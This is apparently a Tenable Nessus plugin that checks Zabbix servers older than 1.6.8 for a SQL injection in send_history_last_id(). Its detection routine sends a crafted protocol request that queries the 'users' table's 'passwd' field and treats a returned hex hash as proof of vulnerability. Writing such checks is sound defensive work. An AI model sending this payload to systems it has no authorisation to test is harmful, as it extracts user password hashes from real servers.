#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(43391);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2016/05/20 14:30:35 $");

  script_bugtraq_id(37309);
  script_osvdb_id(60966);
  script_xref(name:"EDB-ID", value:"10432");
  script_xref(name:"Secunia", value:"37740");

  script_name(english:"Zabbix Server send_history_last_id() SQL Injection");
  script_summary(english:"Attempts a SQL injection attack");

  script_set_attribute(attribute:"synopsis", value:"The remote monitoring service has a SQL injection vulnerability.");
  script_set_attribute(
    attribute:"description",
    value:
"The version of Zabbix server running on the remote host has a SQL
injection vulnerability in the 'send_history_last_id()' function of
'nodehistory.c'.  A remote attacker could exploit this by sending a
specially crafted request, resulting in the execution of arbitrary
queries. 

The vendor released a partial fix in version 1.6.7, but certain types of
SQL injections are still possible."
  );
  script_set_attribute(attribute:"see_also", value:"https://support.zabbix.com/browse/ZBX-1031");
  script_set_attribute(attribute:"see_also", value:"https://support.zabbix.com/secure/attachment/11471/zbx-sqli-v2.py");
  script_set_attribute(attribute:"see_also", value:"http://zabbix.com/rn1.6.8.php");
  script_set_attribute(attribute:"solution", value:"Upgrade to Zabbix 1.6.8 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"vuln_publication_date", value:"2009/09/10");   # posted to bug tracker
  script_set_attribute(attribute:"patch_publication_date", value:"2009/12/07");  # 1.6.8 released
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/12/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_dependencies("zabbix_server_detect.nasl");
  script_require_ports("Services/zabbix_server", 10051);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("byte_func.inc");


port = get_kb_item("Services/zabbix_server");
if (!port) port = 10051;
if (!get_port_state(port)) exit(1, "Port "+port+" is not open.");

soc = open_sock_tcp(port);
if (!soc) exit(1, "Can't open a socket on port "+port+".");

set_byte_order(BYTE_ORDER_LITTLE_ENDIAN);

header = 'ZBXD'+mkbyte(1);
data = 'ZBX_GET_HISTORY_LAST_ID'+mkbyte(0255)+unixtime()+mkbyte(0255)+'\n';
data += 'users' + mkbyte(0255);
data += 'passwd' + mkbyte(0255);
size = mkdword(strlen(data)) + mkdword(0);
req = header+size+data;

send(socket:soc, data:req);

# First get the header
res_header = recv(socket:soc, length:5, timeout:get_read_timeout()+10);
if (isnull(res_header))
  exit(1, "The service on port "+port+" failed to respond with a header.");
if (strlen(res_header) < 5 || header != res_header)
  exit(1, "Unexpected header received on port "+port+".");

# Then get/parse the length field
str_len64 = recv(socket:soc, length:8);
if (isnull(str_len64))
  exit(1, "The service on port "+port+" failed to respond with a length.");
if (strlen(str_len64) < 8)
  exit(1, "Unexpected length field received on port "+port+".");

res_len = getdword(blob:str_len64, pos:0);
high_len = getdword(blob:str_len64, pos:4);

if (high_len != 0)
  exit(1, "Unexpectedly large length received on port "+port+".");

# Then get the data field, which should contain the result of our query
res = recv(socket:soc, length:res_len);
if (isnull(res))
  exit(1, "The service on port "+port+" failed to respond with data.");
if (strlen(res) != res_len)
  exit(1, "Truncated data received on port "+port+".");

# successful SQL injection should return a 128-bit hash. in some versions of
# Zabbix, the last nibble will be omitted
if (
  res != "FAIL" &&
  (res_len == 31 || res_len == 32) &&
  eregmatch(string:res, pattern:'^[A-Fa-f0-9]+$')
)
{
  security_hole(port);
  exit(0);
}
else exit(0, 'The Zabbix server on port '+port+' is not affected.');

